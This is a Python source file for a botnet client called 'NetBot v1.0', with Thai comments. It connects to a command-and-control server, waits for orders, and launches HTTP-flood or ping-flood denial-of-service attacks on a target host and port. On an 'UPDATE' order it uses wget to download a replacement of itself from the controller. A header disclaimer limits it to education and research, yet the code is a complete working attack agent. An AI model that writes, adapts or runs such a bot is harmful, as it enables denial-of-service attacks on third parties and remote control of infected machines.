#!/usr/bin/python
# -*- coding: utf-8 -*-
#
# ผู้เขียน	 : Shankar Narayana Damodaran
# เครื่องมือ	 : NetBot v1.0
# 
# คำอธิบาย	 : นี่คือโค้ดของโปรแกรมคลไคลเอนต์-เซิร์ฟเวอร์สำหรับการควบคุมคำสั่ง
#              		ควรใช้เพื่อการศึกษา, วิจัย และการใช้งานภายในเท่านั้น
#

import socket
import time
import threading
import time
#import requests
import os
import urllib.request
import subprocess
import signal



class launchAttack:
      
	def __init__(self):
		self._running = True
      
	def terminate(self):
		self._running = False
      
	def run(self, n):
		run = 0
		#terminate = 0
		if n[3]=="HTTPFLOOD":
			while self._running and attackSet:
				url_attack = 'http://'+n[0]+':'+n[1]+'/'
				u = urllib.request.urlopen(url_attack).read()
				time.sleep(int(n[4]))

		if n[3]=="PINGFLOOD":
			while self._running:
				if attackSet:
					if run == 0:
						url_attack = 'ping '+n[0]+' -i 0.0000001 -s 65000 > /dev/null 2>&1'
						pro = subprocess.Popen(url_attack, stdout=subprocess.PIPE, shell=True, preexec_fn=os.setsid)
						run = 1
				else:
					if run == 1:
						os.killpg(os.getpgid(pro.pid), signal.SIGTERM)
						run = 0
						break
				


def Main():

	# แฟลกส์
	global attackSet
	attackSet = 0
	global updated
	updated = 0
	global terminate
	terminate = 0


	host = '192.168.0.174' # เซิร์ฟเวอร์ NetBot CCC
	port = 5555 # พอร์ตของ NetBot CCC

	s = socket.socket(socket.AF_INET,socket.SOCK_STREAM) # การเชื่อมต่อ TCP
	try:
		s.connect((host,port)) # เชื่อมต่อกับเซิร์ฟเวอร์ CCC
		message = "HEARTBEAT" # ส่งการตรวจสอบสถานะไปยังเซิร์ฟเวอร์ CCC
		
	except:
		print("เซิร์ฟเวอร์ CCC ไม่ออนไลน์ กำลังเชื่อมต่อใหม่ในทุกๆ 15 วินาที...")
		updated = 0
		time.sleep(15)
		Main()
		
	while True:

		# ส่งข้อความไปยังเซิร์ฟเวอร์
		try:
			s.send(message.encode()) # ใช้ try catch 	

		except:
			Main()
		# รับข้อความจากเซิร์ฟเวอร์
		data = s.recv(1024)

		# พิมพ์ข้อความที่ได้รับ
		#print('ตอบกลับจาก CCC:',str(data.decode()))

		data = str(data.decode())
		data = data.split('_')
		#print('ตอบกลับจาก CCC: ', data)  #ตรวจสอบว่า list ว่างไหม
		if len(data) > 1:
			
			attStatus = data[2]
			attHost = data[0]
			attPort = data[1]
		else:
			attStatus = "OFFLINE"
			

		print('ตอบกลับจาก CCC: ', attStatus)
		
		if attStatus == "LAUNCH":
			if attackSet == 0:
				# เริ่มเธรดใหม่และเริ่มโจมตี (สร้างกระบวนการใหม่)
				attackSet = 1
				c = launchAttack()
				t = threading.Thread(target = c.run, args =(data, ))
				t.start()
				
			else:
				time.sleep(15)
				if t.is_alive():
					print('การโจมตีกำลังดำเนินการ...')
			#else: 
			continue
		elif attStatus == "HALT":
			attackSet = 0
			time.sleep(30)
			continue
		elif attStatus == "HOLD":
			attackSet = 0
			print('กำลังรอคำสั่งจาก CCC กำลังรีลองใน 30 วินาที...')
			time.sleep(30)
		elif attStatus == "UPDATE":
			if updated == 0:
				attackSet = 0
				os.system('wget -N http://192.168.0.174/netbot_client.py -O netbot_client.py > /dev/null 2>&1')
				print('อัปเดตไลบรารีของไคลเอนต์')
				updated = 1
				time.sleep(30)
			else:
				time.sleep(30)
		else:
			attackSet = 0
			print('เซิร์ฟเวอร์คำสั่งออฟไลน์ กำลังรีลองใน 30 วินาที...')
			updated = 0
			time.sleep(30)
	# ปิดการเชื่อมต่อ
	s.close()

if __name__ == '__main__':
	Main()




ทำงานอะไร